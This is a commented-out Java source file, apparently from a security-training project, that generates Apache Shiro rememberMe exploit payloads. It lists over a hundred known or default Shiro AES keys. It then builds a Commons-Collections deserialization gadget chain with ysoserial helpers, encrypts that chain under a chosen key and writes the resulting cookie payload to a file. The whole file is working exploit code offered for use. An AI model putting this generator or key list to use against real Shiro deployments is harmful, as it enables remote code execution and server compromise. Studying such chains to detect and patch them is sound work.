/*
// 需要ysoserial的依赖

package org.joychou.controller;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class ShiroKeyDetect {
    static final String[] keys = {
            "kPH+bIxk5D2deZiIxcaaaA==", "Z3VucwAAAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==",
            "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==",
            "bWljcm9zAAAAAAAAAAAAAA==", "WcfHGU25gNnTxTlmJMeSpw==", "fCq+/xW488hMTCD+cmJ3aQ==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "1QWLxg+NYmxraMoxAXu/Iw==",
            "a2VlcE9uR29pbmdBbmRGaQ==", "5aaC5qKm5oqA5pyvAAAAAA==", "1AvVhdsgUs0FSA3SDFAdag==",
            "5RC7uBZLkByfFfJm22q/Zw==", "3AvVhdAgUs0FSA4SDFAdBg==", "a3dvbmcAAAAAAAAAAAAAAA==",
            "eXNmAAAAAAAAAAAAAAAAAA==", "U0hGX2d1bnMAAAAAAAAAAA==", "Ymx1ZXdoYWxlAAAAAAAAAA==",
            "L7RioUULEFhRyxM7a2R/Yg==", "UGlzMjAxNiVLeUVlXiEjLw==", "bWluZS1hc3NldC1rZXk6QQ==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==", "7AvVhmFLUs0KTA3Kprsdag==", "MTIzNDU2Nzg5MGFiY2RlZg==",
            "OY//C4rhfwNxCQAQCrQQ1Q==", "bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ", "FP7qKJzdJOGkzoQzo2wTmA==",
            "nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3", "LEGEND-CAMPUS-CIPHERKEY==", "r0e3c16IdVkouZgk1TKVMg==",
            "ZWvohmPdUsAWT3=KpPqda", "k3+XHEg6D8tb2mGm7VJ3nQ==", "U3ByaW5nQmxhZGUAAAAAAA==",
            "tiVV6g3uZBGfgshesAQbjA==", "ZAvph3dsQs0FSL3SDFAdag==", "0AvVhmFLUs0KTA3Kprsdag==",
            "25BsmdYwjnfcWmnhAciDDg==", "3JvYhmBLUs0ETA5Kprsdag==", "5AvVhmFLUs0KTA3Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==", "6NfXkC7YVCV5DASIrEm1Rg==", "cmVtZW1iZXJNZQAAAAAAAA==",
            "8AvVhmFLUs0KTA3Kprsdag==", "8BvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==", "aU1pcmFjbGVpTWlyYWNsZQ==", "bXRvbnMAAAAAAAAAAAAAAA==",
            "5J7bIJIV0LQSN3c9LPitBQ==", "bya2HkYo57u6fWh5theAWw==", "f/SY5TIve5WWzT4aQlABJA==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==", "3qDVdLawoIr1xFd6ietnwg==", "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==", "2A2V+RFLUs+eTA3Kpr+dag==", "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==", "2cVtiE83c4lIrELJwKGJUw==", "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==", "sHdIjUN6tzhl8xZMG3ULCQ==", "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==", "rPNqM6uKFCyaL10AK51UkQ==", "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==", "MPdCMZ9urzEA50JDlDYYDg==", "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==", "ClLk69oNcA3m+s0jIMIkpg==", "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==", "ZmFsYWRvLnh5ei5zaGlybw==", "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==", "yeAAo1E8BOeAYfBlm4NG9Q==", "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==", "XgGkgqGqYrix9lI6vxcrRw==", "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==", "s0KTA3mFLUprK4AvVhsdag==", "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==", "d2ViUmVtZW1iZXJNZUtleQ==", "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==", "4BvVhmFLUs0KTA3Kprsdag==", "MzVeSkYyWTI2OFVLZjRzZg==",
            "CrownKey==a12d/dakdad", "empodDEyMwAAAAAAAAAAAA==", "A7UzJgh1+EWj5oBFi+mSgw==",
            "c2hpcm9fYmF0aXMzMgAAAA==", "i45FVt72K2kLgvFrJtoZRw==", "66v1O8keKNV3TTcGPK1wzg==",
            "U3BAbW5nQmxhZGUAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==", "vXP33AonIp9bFwGl7aT7rA==", "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==", "Is9zJ3pzNh2cgTHB4ua3+Q==", "SDKOLKn2J1j/2BHjeZwAoQ==",
            "NsZXjXVklWPZwOfkvk6kUA==", "GAevYnznvgNCURavBhCr1w==",
    };

    public static void main(String[] args) throws Exception{
//        generatePayload();
//        generatePayload2();
        generateExploitPayload();
    }

    private static void generatePayload() throws IOException {
        byte[] exp = getBytes(new SimplePrincipalCollection());
        String[] keys1 = {"nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3"};
        for (String key : keys1) {
            String payload = cipherKeyDetection(key, exp);

            System.out.println(key + ":" + payload);

        }
    }


    private static void generateExploitPayload() throws Exception {
        Object obj = getObject("calc");

        byte[] exp = getBytes(obj);
        String[] keys1 = {"nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3"};
        for (String key : keys1) {
            String payload = cipherKeyDetection(key, exp);

            System.out.println(key + ":" + payload);
            writeToFile(payload, "shiroExploitPayload.txt");
        }
    }


    private static void generatePayload2() throws IOException{
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("shiroPayload.ser"));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
    }


    private static String cipherKeyDetection(String key, byte[] exp) {
        return shiroRememberMeEncrypt(key, exp);
    }

    private static String shiroRememberMeEncrypt(String key, byte[] objectBytes) {
        Base64 b64 = new Base64();
        byte[] keyDecode = b64.decode(key);
        AesCipherService cipherService = new AesCipherService();
        ByteSource byteSource = cipherService.encrypt(objectBytes, keyDecode);
        byte[] value = byteSource.getBytes();
        return new String(b64.encode(value));
    }

    private static byte[] getBytes(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = null;
        ObjectOutputStream objectOutputStream = null;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }


    public static Map getObject(final String command) throws Exception {
        Object tpl = Gadgets.createTemplatesTomcatEcho();
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }


    private static void writeToFile(String str, String fileName){
        FileWriter writer;
        try {
            writer = new FileWriter(fileName);
            writer.write(str);
            writer.flush();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
*/